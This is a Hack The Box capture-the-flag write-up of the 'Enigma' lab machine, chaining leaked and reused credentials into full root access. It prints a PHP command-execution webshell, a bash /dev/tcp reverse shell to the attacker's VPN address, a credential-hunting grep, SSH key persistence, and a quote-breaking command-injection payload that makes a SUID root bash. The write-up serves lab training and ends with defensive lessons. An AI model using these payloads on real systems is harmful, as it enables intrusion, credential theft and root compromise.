---
title: "HTB Enigma - Complete Writeup"
author: "Muhammad Iqbal Latif"
platform: "Hack The Box"
date: "2026-07-04"
tags:
  - HTB
  - Enigma
  - NFS
  - IMAP
  - Roundcube
  - OpenSTAManager
  - OliveTin
  - Webshell
  - Command-Injection
  - Privilege-Escalation
---

# 🧩 HTB Enigma - Complete Writeup

> [!summary]
> This is a full Obsidian-style writeup for **HTB Enigma**.  
> The path was not a single CVE. It was a chain of small weaknesses: exposed NFS files, onboarding credentials, mailbox pivoting, password reuse, an authenticated OpenSTAManager restore abuse, a PHP webshell, user pivoting, and root command injection through OliveTin.

---

## 📌 Target Information

| Item | Value |
|---|---|
| Machine | Enigma |
| Platform | Hack The Box |
| Target IP used | `10.129.113.63` |
| Main domain | `enigma.htb` |
| Webmail domain | `mail001.enigma.htb` |
| Support app domain | `support_001.enigma.htb` |
| Foothold user | `www-data` |
| Local user | `haris` |
| Root method | OliveTin command injection |
| User flag | `REDACTED`, read from `/home/haris/user.txt` |
| Root flag | `REDACTED`, read from `/root/root.txt` |

> [!warning]
> This writeup is for authorized HTB lab practice only. Do not run these commands on systems you do not own or do not have permission to test.

---

# 🧠 High-Level Attack Chain

```text
Nmap scan
  -> NFS export discovered
  -> Onboarding PDF found
  -> Kevin's webmail credentials recovered
  -> Kevin inbox revealed Sarah
  -> Sarah reused the same password
  -> Sarah inbox leaked OpenSTAManager admin credentials
  -> OpenSTAManager backup restore wrote a PHP shell
  -> Reverse shell as www-data
  -> Local credentials found for haris
  -> SSH access as haris
  -> OliveTin found on 127.0.0.1:1337
  -> Backup Database action vulnerable to command injection
  -> SUID rootbash created
  -> Root shell
```

---

# 🗺️ Attack Flow Diagram

```mermaid
flowchart TD
    A[Start: 10.129.113.63] --> B[Nmap Scan]
    B --> C[NFS: /srv/nfs/onboarding]
    C --> D[New_Employee_Access.pdf]
    D --> E[kevin / Enigma2024!]
    E --> F[Roundcube Webmail]
    F --> G[Kevin Inbox]
    G --> H[Sarah Discovered]
    H --> I[sarah / Enigma2024!]
    I --> J[OpenSTAManager Credentials]
    J --> K[Admin Login]
    K --> L[Backup Restore Upload]
    L --> M[/tmp/shell.php]
    M --> N[Reverse Shell: www-data]
    N --> O[Pivot to haris]
    O --> P[User Flag]
    P --> Q[OliveTin Local Service]
    Q --> R[Command Injection]
    R --> S[/tmp/rootbash SUID]
    S --> T[Root Flag]
```

---

# 1. Workspace Setup

```bash
mkdir -p ~/HTB/Enigma/{nmap,loot,exploits,notes}
cd ~/HTB/Enigma
```

## Breakdown

| Command | Explanation |
|---|---|
| `mkdir -p` | Creates folders and does not complain if they already exist |
| `~/HTB/Enigma` | Main workspace for the machine |
| `nmap` | Stores scan outputs |
| `loot` | Stores files recovered from the target |
| `exploits` | Stores exploit payloads |
| `notes` | Stores manual notes |

---

# 2. Initial Nmap Enumeration

## 2.1 Full TCP scan

```bash
sudo nmap -p- --min-rate 5000 -Pn -oN nmap/full-tcp.txt 10.129.113.63
```

## 2.2 Service and script scan

```bash
ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/full-tcp.txt | paste -sd, -)
sudo nmap -sC -sV -p "$ports" -Pn -oN nmap/service-scan.txt 10.129.113.63
```

## Important results

```text
22/tcp    open  ssh       OpenSSH 9.6p1 Ubuntu
80/tcp    open  http      nginx 1.24.0, redirects to http://enigma.htb/
110/tcp   open  pop3      Dovecot pop3d
111/tcp   open  rpcbind
143/tcp   open  imap      Dovecot imapd
993/tcp   open  ssl/imap  Dovecot imapd
995/tcp   open  ssl/pop3  Dovecot pop3d
2049/tcp  open  nfs_acl   NFS
```

## Breakdown

| Option | Meaning |
|---|---|
| `-p-` | Scans every TCP port |
| `--min-rate 5000` | Makes the scan faster |
| `-Pn` | Skips host discovery and treats the target as alive |
| `-sC` | Runs default Nmap scripts |
| `-sV` | Detects service versions |
| `-oN` | Saves output in normal text format |

## Initial interpretation

| Finding | Importance |
|---|---|
| Port 80 redirects to `enigma.htb` | We need a hosts file entry |
| NFS is open | Possible information disclosure |
| IMAP and POP3 are open | Mailboxes may contain credentials or hints |
| SSH is open | Useful later after finding local credentials |

---

# 3. Hostname Setup

The web server redirected to `enigma.htb`, so local DNS mapping was required.

```bash
sudo sh -c 'echo "10.129.113.63 enigma.htb" >> /etc/hosts'
```

Later, two more vhosts were discovered. The final hosts entry was:

```bash
sudo sh -c 'echo "10.129.113.63 enigma.htb mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts'
```

## Breakdown

| Hostname | Purpose |
|---|---|
| `enigma.htb` | Main web vhost |
| `mail001.enigma.htb` | Roundcube webmail vhost |
| `support_001.enigma.htb` | OpenSTAManager vhost |

> [!tip]
> If a web page redirects to a hostname, add that hostname to `/etc/hosts`. Otherwise, the browser may not reach the correct virtual host.

---

# 4. NFS Enumeration

## 4.1 List NFS exports

```bash
showmount -e 10.129.113.63
```

Output:

```text
Export list for 10.129.113.63:
/srv/nfs/onboarding *
```

## Breakdown

| Part | Meaning |
|---|---|
| `showmount -e` | Lists NFS shares exported by the target |
| `/srv/nfs/onboarding` | Exposed NFS share |
| `*` | Any client can mount it |

---

## 4.2 Mount the NFS share

```bash
sudo mkdir -p /mnt/enigma_nfs
sudo mount -t nfs -o vers=3,nolock 10.129.113.63:/srv/nfs/onboarding /mnt/enigma_nfs
```

## Breakdown

| Part | Purpose |
|---|---|
| `sudo mkdir -p /mnt/enigma_nfs` | Creates a local mount folder |
| `mount -t nfs` | Mounts a remote NFS share |
| `vers=3` | Uses NFS version 3 |
| `nolock` | Avoids lock issues in lab environments |
| `10.129.113.63:/srv/nfs/onboarding` | Remote export path |
| `/mnt/enigma_nfs` | Local mount point |

---

## 4.3 Inspect files

```bash
cd /mnt/enigma_nfs
ls -la
find . -maxdepth 5 -ls
```

Output:

```text
total 8
drwxr-xr-x  2 root root 4096 Feb 20 00:54 .
drwxr-xr-x. 1 root root   20 Jul  4 09:40 ..
-rw-r--r--  1 root root 1751 Feb 20 00:53 New_Employee_Access.pdf
```

Interesting file:

```text
New_Employee_Access.pdf
```

---

# 5. Credential Leak Through Onboarding PDF

The PDF contained a new employee onboarding document.

## Important PDF data

| Field | Value |
|---|---|
| Employee | Kevin Mitchell |
| Department | Operations |
| Webmail URL | `http://mail001.enigma.htb` |
| Username | `kevin` |
| Password | `Enigma2024!` |
| Support email | `it@enigma.htb` |

> [!danger]
> This is a direct credential disclosure. Internal onboarding documents should not be stored on a public NFS export, and they should not contain cleartext passwords.

---

# 6. Roundcube Webmail Access

Add the mail vhost:

```bash
sudo sh -c 'echo "10.129.113.63 mail001.enigma.htb" >> /etc/hosts'
```

Open:

```text
http://mail001.enigma.htb
```

Login:

```text
Username: kevin
Password: Enigma2024!
```

Roundcube was accessible, but exploiting Roundcube was not needed. The useful path was reading mail and pivoting to another mailbox.

---

# 7. IMAP Enumeration with curl

## 7.1 Set target variable

```bash
TARGET=mail001.enigma.htb
```

## 7.2 List Kevin's folders

```bash
curl -s --url "imaps://$TARGET/" --user "kevin:Enigma2024!" -k
```

## 7.3 Read Kevin's first inbox message

```bash
curl -s --url "imaps://$TARGET/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
```

Important output:

```text
From: sarah@enigma.htb
Subject: Welcome to Enigma Corp, Kevin!

I'm Sarah from the Accounts department. I'll be your point of contact...
```

## Breakdown

| Part | Purpose |
|---|---|
| `imaps://` | Connects to IMAP over SSL, usually port 993 |
| `--user "kevin:Enigma2024!"` | Supplies mailbox credentials |
| `-k` | Ignores TLS certificate validation |
| `INBOX/;MAILINDEX=1` | Reads message number 1 from the inbox |

---

# 8. Password Reuse Against Sarah

Kevin's inbox revealed Sarah as a valid internal user:

```text
sarah@enigma.htb
```

The same onboarding password worked for Sarah.

## 8.1 Test Sarah mailbox

```bash
curl -s --url "imaps://$TARGET/" --user "sarah:Enigma2024!" -k
```

If folders are listed, login succeeded.

## 8.2 Read Sarah's inbox

```bash
curl -s --url "imaps://$TARGET/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
```

Important email:

```text
Subject: Re: OpenSTAManager Access Request

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

> [!important]
> This was the key pivot. No brute force was required. The path relied on password reuse and mailbox trust.

---

# 9. OpenSTAManager Login

Add the support vhost:

```bash
sudo sh -c 'echo "10.129.113.63 support_001.enigma.htb" >> /etc/hosts'
```

Open:

```text
http://support_001.enigma.htb
```

Login:

```text
Username: admin
Password: Ne3s4rtars78s
```

## Application details

| Item | Value |
|---|---|
| Application | OpenSTAManager |
| Version | `2.9.8` |
| Backup path | `/var/www/html/openstamanager/files/backups` |
| Upload limit | `2M` |
| Max execution time | `30s` |
| Useful page | `Tools -> Backup` |

---

# 10. OpenSTAManager Backup Restore Abuse

## 10.1 Goal

Use the backup restore feature to write a PHP webshell into a web-accessible directory.

Final working webshell:

```text
http://support_001.enigma.htb/tmp/shell.php
```

---

## 10.2 Create a small restore ZIP

The full backup archive was too large for the upload limit. The UI showed:

```text
upload_max_filesize: 2M
max_execution_time: 30s
```

So a smaller ZIP was needed.

```bash
mkdir -p ~/HTB/Enigma/exploits/osm_restore/tmp
cd ~/HTB/Enigma/exploits/osm_restore
```

Create the PHP webshell:

```bash
cat > tmp/shell.php << 'PHP'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
PHP
```

Create a marker file:

```bash
echo 'ENIGMA_MARKER_OK' > tmp/osmcheck.txt
```

Add minimal metadata:

```bash
echo '2.9.8' > VERSION
echo 'debug-shell-restore' > REVISION
echo '{}' > modules.json
```

Create the ZIP:

```bash
zip -r OSM_under_2MB_shell_restore.zip .
ls -lh OSM_under_2MB_shell_restore.zip
```

---

## 10.3 Restore the payload

In the OpenSTAManager UI:

```text
Tools -> Backup -> Restore backup -> Browse -> Select ZIP -> Restore
```

Then test possible locations:

```bash
for p in \
/osmcheck.txt \
/shell.php \
/tmp/osmcheck.txt \
/tmp/shell.php \
/files/osmcheck.txt \
/files/shell.php \
/files/backups/osmcheck.txt \
/files/backups/shell.php \
/openstamanager/osmcheck.txt \
/openstamanager/shell.php
 do
  echo "===== $p ====="
  curl -s -i "http://support_001.enigma.htb$p?cmd=id" | head -n 8
 done
```

Working result:

```text
===== /tmp/shell.php =====
HTTP/1.1 200 OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!note]
> `/shell.php` returned 404. The correct path was `/tmp/shell.php`.

---

# 11. Webshell Command Execution

Set a variable:

```bash
SHELL="http://support_001.enigma.htb/tmp/shell.php"
```

Test command execution:

```bash
curl -G "$SHELL" --data-urlencode "cmd=id"
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Breakdown

| Part | Meaning |
|---|---|
| `curl -G` | Sends data as URL query parameters |
| `--data-urlencode` | Encodes special characters safely |
| `cmd=id` | Executes the `id` command through PHP |

---

# 12. Reverse Shell as www-data

## 12.1 Get VPN IP

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
```

Output:

```text
10.10.14.25
```

## 12.2 Start listener

```bash
nc -lvnp 4444
```

## 12.3 Trigger reverse shell

```bash
curl -G "$SHELL" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1'"
```

Received:

```text
www-data@enigma:~/html/openstamanager/tmp$ whoami
www-data
```

---

# 13. Shell Upgrade

Inside the reverse shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press:

```text
CTRL+Z
```

On attacker terminal:

```bash
stty raw -echo; fg
```

Press Enter, then run:

```bash
export TERM=xterm
stty rows 40 columns 120
```

---

# 14. Pivot to haris

## 14.1 Find local users

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```

Interesting user:

```text
haris
```

## 14.2 Search for credentials

```bash
grep -RniE 'haris|bestfriends|password|passwd|db_pass|db_user|database|mysql|username' /var/www /opt 2>/dev/null
```

Valid local credentials found:

```text
haris:bestfriends
```

## 14.3 Test the credentials

```bash
printf 'bestfriends\n' | su haris -c 'id'
```

Switch user:

```bash
su - haris
```

Password:

```text
bestfriends
```

---

# 15. User Flag

As `haris`:

```bash
whoami
id
cat /home/haris/user.txt
```

Location:

```text
/home/haris/user.txt
```

```text
user.txt: REDACTED
```

> [!success]
> User flag submitted successfully.

---

# 16. Stable SSH Access

## 16.1 Generate SSH key on attacker machine

```bash
ssh-keygen -t ed25519 -f ~/.ssh/enigma_haris -N ''
cat ~/.ssh/enigma_haris.pub
```

## 16.2 Add the key on the target

On target as `haris`:

```bash
mkdir -p ~/.ssh
echo 'PASTE_PUBLIC_KEY_HERE' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

## 16.3 SSH in

```bash
ssh -i ~/.ssh/enigma_haris haris@10.129.113.63
```

---

# 17. Local Privilege Escalation Enumeration

## 17.1 Check listening services

```bash
ss -lntp
```

Important result:

```text
127.0.0.1:1337
```

This was a local-only service, so it was not accessible directly from the attacker machine.

---

## 17.2 Read OliveTin config

```bash
cat /etc/OliveTin/config.yaml
```

Important configuration:

```yaml
listenAddressSingleHTTPFrontend: 127.0.0.1:1337

actions:
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

The vulnerable action was:

```text
Backup Database
```

---

# 18. OliveTin Command Injection

## 18.1 Vulnerable command

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

The dangerous part is:

```bash
-p'{{ db_pass }}'
```

The `db_pass` field is inserted inside single quotes. By entering a single quote, we can break out of the intended password string and inject another command.

## 18.2 Payload

```text
x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

This turns the command into something like:

```bash
mysqldump -u backup_svc -p'x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #' production > /opt/backups/backup.sql
```

The injected part does this:

```bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

## Why `chmod 4755` matters

| Number | Meaning |
|---|---|
| `4` | Sets SUID bit |
| `7` | Owner can read, write, execute |
| `5` | Group can read and execute |
| `5` | Others can read and execute |

Because OliveTin runs the action with elevated privileges, `/tmp/rootbash` becomes a root-owned SUID bash.

---

# 19. Access OliveTin Through Port Forwarding

From attacker machine:

```bash
ssh -i ~/.ssh/enigma_haris -N -L 1337:127.0.0.1:1337 haris@10.129.113.63
```

Open locally:

```text
http://127.0.0.1:1337
```

Run action:

```text
Backup Database
```

Fields:

```text
db_user: backup_svc
db_name: production
db_pass: x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

> [!note]
> The OliveTin UI may show a `mysqldump` warning or usage error. That is fine. The original database command is intentionally broken. The important question is whether `/tmp/rootbash` was created.

---

# 20. Root Shell

Back in the `haris` SSH shell:

```bash
ls -la /tmp/rootbash
```

Expected:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Run privileged bash:

```bash
/tmp/rootbash -p
```

Check identity:

```bash
whoami
id
```

Expected:

```text
root
uid=0(root)
```

---

# 21. Root Flag

Use an absolute path:

```bash
cat /root/root.txt
```

Location:

```text
/root/root.txt
```

```text
root.txt: REDACTED
```

> [!success]
> Root flag submitted successfully.

---

# 22. Troubleshooting

## `/shell.php` is 404

Use the real working location:

```bash
curl -G "http://support_001.enigma.htb/tmp/shell.php" --data-urlencode "cmd=id"
```

## OpenSTAManager cron warning

The warning about cron not being configured correctly is unrelated to the exploit. It does not mean restore failed.

## OliveTin shows mysqldump error

This is expected. The injected command can still execute even if `mysqldump` fails.

Check:

```bash
ls -la /tmp/rootbash
```

## `/tmp/rootbash -p` opens inside `/home/haris`

That is normal. You are root but still in the same directory.

Use:

```bash
cat /root/root.txt
```

---

# 23. Key Concepts Learned

| Stage | Concept | Explanation |
|---|---|---|
| NFS | Information disclosure | Public NFS share leaked onboarding PDF |
| PDF | Credential leakage | Cleartext webmail credentials were exposed |
| Mail | Password reuse | Kevin's password also worked for Sarah |
| Mail | User discovery | Kevin's inbox revealed Sarah's email |
| Web app | Authenticated file write | OSM restore wrote PHP into `/tmp` |
| Webshell | Command execution | PHP `system()` executed OS commands |
| Linux | User pivot | Local credentials gave access to `haris` |
| Internal service | Local-only exposure | OliveTin listened on `127.0.0.1:1337` |
| OliveTin | Command injection | User input was placed into a shell command unsafely |
| Root | SUID bash | Root-owned SUID bash gave a root shell |

---

# 24. Defensive Lessons

## NFS hardening

- Do not expose internal shares to everyone.
- Restrict exports to required IP addresses.
- Avoid storing credentials in shared documents.
- Use strict permissions and `root_squash`.

## Credential hygiene

- Do not use shared onboarding passwords.
- Force password reset on first login.
- Avoid reusing passwords across accounts.
- Use secret management tools instead of plaintext documents.

## Mail security

- Do not email admin credentials.
- Use expiring password setup links.
- Use MFA for mail and admin panels.

## Web app hardening

- Backup restore should validate archive structure.
- Restore should not write to web-accessible paths.
- Executable extensions like `.php` should be blocked.
- Upload and restore features should run with minimal privileges.

## Command injection prevention

- Do not interpolate user input into shell commands.
- Use safe argument arrays instead of shell strings.
- Validate inputs strictly.
- Do not run automation services as root unless necessary.

---

# 25. Full Command Reference

## Nmap

```bash
sudo nmap -p- --min-rate 5000 -Pn -oN nmap/full-tcp.txt 10.129.113.63
ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/full-tcp.txt | paste -sd, -)
sudo nmap -sC -sV -p "$ports" -Pn -oN nmap/service-scan.txt 10.129.113.63
```

## Hosts

```bash
sudo sh -c 'echo "10.129.113.63 enigma.htb mail001.enigma.htb support_001.enigma.htb" >> /etc/hosts'
```

## NFS

```bash
showmount -e 10.129.113.63
sudo mkdir -p /mnt/enigma_nfs
sudo mount -t nfs -o vers=3,nolock 10.129.113.63:/srv/nfs/onboarding /mnt/enigma_nfs
cd /mnt/enigma_nfs
ls -la
find . -maxdepth 5 -ls
```

## IMAP

```bash
TARGET=mail001.enigma.htb
curl -s --url "imaps://$TARGET/" --user "kevin:Enigma2024!" -k
curl -s --url "imaps://$TARGET/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
curl -s --url "imaps://$TARGET/" --user "sarah:Enigma2024!" -k
curl -s --url "imaps://$TARGET/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
```

## Payload ZIP

```bash
mkdir -p ~/HTB/Enigma/exploits/osm_restore/tmp
cd ~/HTB/Enigma/exploits/osm_restore
cat > tmp/shell.php << 'PHP'
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
PHP
echo 'ENIGMA_MARKER_OK' > tmp/osmcheck.txt
echo '2.9.8' > VERSION
echo 'debug-shell-restore' > REVISION
echo '{}' > modules.json
zip -r OSM_under_2MB_shell_restore.zip .
```

## Webshell

```bash
SHELL="http://support_001.enigma.htb/tmp/shell.php"
curl -G "$SHELL" --data-urlencode "cmd=id"
```

## Reverse shell

```bash
ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
nc -lvnp 4444
curl -G "$SHELL" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1'"
```

## Pivot to haris

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
printf 'bestfriends\n' | su haris -c 'id'
su - haris
cat /home/haris/user.txt
```

## SSH persistence

```bash
ssh-keygen -t ed25519 -f ~/.ssh/enigma_haris -N ''
cat ~/.ssh/enigma_haris.pub
```

On target:

```bash
mkdir -p ~/.ssh
echo 'PASTE_PUBLIC_KEY_HERE' >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

SSH:

```bash
ssh -i ~/.ssh/enigma_haris haris@10.129.113.63
```

## OliveTin root

```bash
ss -lntp
cat /etc/OliveTin/config.yaml
ssh -i ~/.ssh/enigma_haris -N -L 1337:127.0.0.1:1337 haris@10.129.113.63
```

OliveTin fields:

```text
db_user: backup_svc
db_name: production
db_pass: x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```

Root shell:

```bash
ls -la /tmp/rootbash
/tmp/rootbash -p
id
cat /root/root.txt
```

---

# ✅ Completion Checklist

- [x] Nmap enumeration completed
- [x] Vhosts added
- [x] NFS share mounted
- [x] Onboarding PDF recovered
- [x] Kevin mailbox accessed
- [x] Sarah discovered
- [x] Sarah mailbox accessed through password reuse
- [x] OpenSTAManager admin credentials recovered
- [x] Backup restore abused
- [x] PHP webshell obtained
- [x] Reverse shell as `www-data`
- [x] Pivoted to `haris`
- [x] User flag submitted
- [x] OliveTin discovered
- [x] Command injection exploited
- [x] Root shell obtained
- [x] Root flag submitted

---

# 🏁 Final Result

```text
Machine: Enigma
User: owned
Root: owned
```

The main lesson from Enigma is that real compromise often comes from chaining small mistakes. No single step was extremely complex, but together they created a complete path from public information disclosure to root access.
